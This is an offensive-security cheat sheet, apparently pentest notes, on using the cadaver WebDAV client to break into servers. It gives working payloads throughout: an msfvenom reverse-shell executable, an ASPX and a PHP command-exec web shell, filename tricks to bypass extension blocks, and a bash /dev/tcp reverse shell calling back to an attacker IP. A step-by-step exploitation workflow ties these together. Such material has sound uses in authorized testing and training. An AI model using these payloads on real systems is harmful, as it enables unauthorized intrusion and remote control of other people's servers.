# Cadaver – WebDAV Client

!!! tip "Tip"
    `cadaver http://10.10.10.10/webdav/` opens an interactive FTP-like session. Use `put shell.php` to upload, `ls` to list. If the server is IIS, upload `.asp` or `.aspx` instead of `.php`.

---
## Connecting to a WebDAV Server

```bash
cadaver http://10.10.10.10/path/
```

If authentication is required, cadaver will prompt for username and password:

```bash
cadaver http://10.10.10.10/
Authentication required for webdav on server `10.10.10.10':
Username: test
Password: ****
```

For HTTPS with a self-signed cert:

```bash
cadaver https://10.10.10.10/
```

To skip SSL verification:

```bash
GIT_SSL_NO_VERIFY=1 cadaver https://10.10.10.10/
```

---

## Useful Cadaver Commands

Once connected:

| Command | Description |
|---|---|
| `ls` | List directory contents |
| `cd <dir>` | Change directory |
| `get <file>` | Download a file |
| `put <file>` | Upload a file |
| `mget <files>` | Download multiple files |
| `mput <files>` | Upload multiple files |
| `delete <file>` | Delete a file |
| `mkdir <dir>` | Create directory |
| `rmdir <dir>` | Remove directory |
| `exit` | Close the session |

---
## Uploading Files (Payload Deployment)

### Upload a Reverse Shell

Upload an ASPX web shell to IIS:

```
put /usr/share/webshells/aspx/cmdasp.aspx
```

Create a payload:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f exe > revshell.exe
```

Navigate to the site to interact with `cmdasp.aspx`:

```bash
http://10.10.10.10/cmdasp.aspx
```

Find where the shell is stored using the `cmdasp.aspx` command box:

```bash
dir -s c:\
```

Once you locate `revshell.exe`, start a listener and execute from the `cmdasp.aspx` page:

```
c:\inetpub\wwwroot\revshell.exe
```

### Upload a Basic Web Shell

For PHP-enabled WebDAV servers:

```bash
put shell.php
```

Basic PHP reverse shell:

```php
<?php system($_GET['cmd']); ?>
```

Access in browser:

```
http://10.10.10.10/shell.php?cmd=whoami
```

### Upload with Filename Bypass (if extensions blocked)

```bash
put shell.pHp
put shell.ph%00p
put shell.php;.txt
```

---

## Exploitation Workflow

1. **Identify WebDAV Support**

    ```bash
    nmap -n -sV --script http-iis-webdav-vuln.nse 10.10.10.10
    curl -X OPTIONS http://10.10.10.10/
    ```

    Look for `DAV: 1,2` in response headers.

2. **Connect to the WebDAV Directory**

    ```bash
    cadaver http://10.10.10.10/
    ```

3. **Check Write Permissions**

    ```bash
    ls
    mkdir testdir
    put testfile.txt
    ```

4. **Upload Web Shell**

    ```bash
    put shell.php
    ```

5. **Execute Shell**

    ```bash
    curl http://10.10.10.10/shell.php?cmd=id
    ```

6. **Establish Reverse Shell**

    ```php
    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'"); ?>
    ```

---

## Misconfigurations to Look For

- Anonymous WebDAV write access (no auth required)
- Directory traversal via WebDAV pathing
- Web servers that allow execution of uploaded scripts (PHP, ASP, JSP)
- IIS with WebDAV and `.aspx` execution enabled
- Misconfigured DAV ACLs allowing write from low-privileged accounts
